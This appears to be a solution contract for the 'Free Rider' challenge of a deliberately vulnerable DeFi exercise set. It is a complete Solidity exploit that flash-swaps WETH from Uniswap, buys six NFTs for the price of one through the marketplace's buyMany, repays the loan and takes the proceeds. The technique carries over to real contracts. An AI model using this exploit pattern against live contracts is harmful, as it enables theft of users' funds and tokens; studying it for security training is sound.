import "./FreeRiderBuyer.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "../WETH9.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract AttackFreeRider is IERC721Receiver {
    IUniswapV2Pair private immutable pair;
    FreeRiderNFTMarketplace private immutable marketplace;
    FreeRiderBuyer private immutable buyContract;
    IERC721 private immutable nft;
    address private immutable attacker;
    WETH9 private immutable weth;
    uint[] tokenIds = [0,1,2,3,4,5];
    constructor(
        address _pair,
        address payable _marketplace,
        address _buyContract,
        address _nft,
        address payable _weth
    ) {
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        buyContract = FreeRiderBuyer(_buyContract);
        nft = IERC721(_nft);
        attacker = msg.sender;
        weth = WETH9(_weth);
    }

    function attack(uint _amount) external {
        bytes memory _data = abi.encode(weth); // any arbitraty data to encode will do
        pair.swap(
            _amount, // amount of the WETH we are flash swapping 
            0, // amount of tokens we are flash swapping, zero in this case
            address(this), // recipient of the loan
            _data // data that will be passed to the uniswapV2Call function that the pair triggers on the recipient address, this address
        ); 
        for(uint i = 0; i < 6; i++){
            nft.safeTransferFrom(address(this), address(buyContract), tokenIds[i]);
        } 
        (bool success, ) = msg.sender.call{value: address(this).balance }('');
        require(success, "ETH transfer failed");
    }

    function uniswapV2Call(
        address _sender, 
        uint _amount0,
        uint,
        bytes calldata
    ) external {
        require(msg.sender == address(pair), "Only WETH/DVT pair contract can call this function");
        require(_sender == address(this), "Only this contract can execute the flashloan");
        weth.withdraw(_amount0);
        marketplace.buyMany{value: address(this).balance }(tokenIds);
        uint _fee = 1+((_amount0)*3)/997; // 1+ is there in case the integer division equals zero.
        uint _repayAmount = _fee + _amount0;
        weth.deposit{value: _repayAmount}();
        weth.transfer(address(pair), _repayAmount);
    }
    receive() external payable {}
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external view override returns (bytes4) {
        require(msg.sender == address(nft));
        require(tx.origin == attacker);
        return IERC721Receiver.onERC721Received.selector;
    }
}